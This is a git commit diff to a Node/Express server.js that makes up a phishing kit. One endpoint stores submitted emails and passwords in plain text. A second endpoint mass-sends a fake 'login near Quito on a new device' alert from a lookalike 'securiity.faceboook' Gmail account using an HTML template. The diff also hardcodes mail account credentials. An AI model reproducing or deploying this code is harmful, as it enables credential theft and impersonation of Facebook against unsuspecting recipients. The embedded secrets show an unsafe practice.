6d4f5d7a8db347a35a3b0ff771f3218d8c6e6e20
jeseniaisabel231 <john.mata@epn.edu.ec>
2024-11-07 16:52:55 -0500

    mm

--- server.js
+++ server.js
@@ -1,45 +1,52 @@
-const express = require('express');
-const mongoose = require('mongoose');
-const bodyParser = require('body-parser');
-const cors = require('cors');
+const express = require("express");
+const mongoose = require("mongoose");
+const bodyParser = require("body-parser");
+const cors = require("cors");
 require("dotenv").config();
-const nodemailer = require('nodemailer');
+const nodemailer = require("nodemailer");
+const path = require("path");
+const fs = require("fs");
 
 const app = express();
 app.use(cors());
 app.use(bodyParser.json());
 
-mongoose.connect(process.env.MONGO_URI,{
-    useNewUrlParser: true,
-    useUnifiedTopology: true
+mongoose.connect(process.env.MONGO_URI, {
+	useNewUrlParser: true,
+	useUnifiedTopology: true,
 });
 
-const datos =  new  mongoose.Schema({
-    email: String,
-    password: String
-})
-
-const usuario =  mongoose.model('usuario', datos);
-
-app.post("/hasSidoHackeado", async ( req , res ) => {
-    const { email , password } = req.body;
-    const usuarioBD = new usuario({ email , password });
-    await usuarioBD.save();
-    res.status(201).send("Informacion  guardada");
+const datos = new mongoose.Schema({
+	email: String,
+	password: String,
 });
 
-app.post("/enviarEmail", async (req, res)=>{
-    const { correos } = req.body;
-    try {
-        let trasnsportador = nodemailer.createTransport({service:'gmail', auth:{user:'john.mata@epn.edu.ec', pass:'1234'}})
-        const respuesta = await trasnsportador.sendMail({from:'correooooooooooo', to:correos.join(','), subject:'Acabas de iniciaser '})
-    } catch (error) {
-        
-    } 
-})
+const usuario = mongoose.model("usuario", datos);
 
-app.listen(3000,  () => {
-    console.log("Servidor escuchando en el puerto 3000");
-})
+app.post("/hasSidoHackeado", async (req, res) => {
+	const { email, password } = req.body;
+	const usuarioBD = new usuario({ email, password });
+	await usuarioBD.save();
+	res.status(201).send("Informacion  guardada");
+});
 
-
+app.post("/enviarEmail", async (req, res) => {
+	const { correos } = req.body;
+	const plantilla = path.join(__dirname, "index.html");
+	let plantilla2 = fs.readFileSync(plantilla, "utf-8");
+	try {
+		let trasnsportador = nodemailer.createTransport({
+			service: "gmail",
+			auth: { user: "securiity.faceboook.mail@gmail.com", pass: "1234567890abc." },
+		});
+		const respuesta = await trasnsportador.sendMail({
+			from: "securiity.faceboook.mail@gmail.com",
+			to: correos.join(","),
+			subject: "¿Acabas de iniciar sesión cerca de Quito en un dispositivo nuevo?",
+            html: plantilla2
+		});
+	} catch (error) {}
+});
+app.listen(3000, () => {
+	console.log("Servidor escuchando en el puerto 3000");
+});
